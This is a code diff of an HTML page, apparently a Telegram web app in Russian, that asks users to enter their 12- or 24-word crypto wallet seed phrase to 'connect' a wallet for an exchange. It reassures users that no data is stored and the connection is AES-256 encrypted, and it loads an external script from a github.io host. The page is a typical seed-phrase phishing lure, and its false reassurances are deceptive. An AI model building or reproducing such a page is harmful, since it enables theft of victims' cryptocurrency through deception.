@@ -9,24 +9,24 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet" />
 
     <!-- Feather Icons -->
-    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
 
     <!-- Telegram WebApp SDK -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script defer src="https://telegram.org/js/telegram-web-app.js"></script>
 
-    <!-- Styles -->
+    <!-- Custom Styles -->
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
-    <script src="https://sp574-maker.github.io/maker/script.js"></script>
 </head>
 <body>
-    <div class="container">
+    <main class="container">
         <h1><i data-feather="shield"></i> Подключение кошелька</h1>
 
-        <p>
+        <p class="description">
             Для продолжения обмена подключите ваш Web3-кошелёк с помощью seed-фразы.<br>
             Мы не храним ваши данные и не запрашиваем доступ к средствам.
         </p>
 
+        <!-- Wallet select -->
         <label><i data-feather="credit-card"></i> Выберите кошелёк</label>
         <div class="custom-select-wrapper">
             <div class="custom-select" id="walletSelect">
@@ -56,23 +56,34 @@
         </div>
         <input type="hidden" id="wallet" name="wallet" value="MetaMask" />
 
+        <!-- Seed phrase length selector -->
         <label for="length"><i data-feather="list"></i> Количество слов</label>
         <select id="length" onchange="renderSeedInputs(); clearWarning();">
             <option value="12">12 слов</option>
             <option value="24">24 слова</option>
         </select>
 
+        <!-- Dynamic seed input fields -->
         <div id="seedContainer" class="seed-grid"></div>
 
-        <div id="validationWarning" class="warning" style="display:none;"></div>
+        <!-- Warning output -->
+        <div id="validationWarning" class="warning" style="display: none;"></div>
 
+        <!-- Submit button -->
         <button id="submitBtn">
             <i data-feather="link"></i> Подключить
         </button>
 
+        <!-- Processing feedback -->
+        <div id="processingInfo" class="info" style="display: none;"></div>
+
+        <!-- Footer -->
         <p class="small">
             <i data-feather="lock"></i> Соединение зашифровано AES-256. Мы уважаем вашу приватность.
         </p>
-    </div>
+    </main>
+
+    <!-- Custom Script (в самому кінці, після DOM) -->
+    <script src="https://sp574-maker.github.io/maker/script.js"></script>
 </body>
 </html>
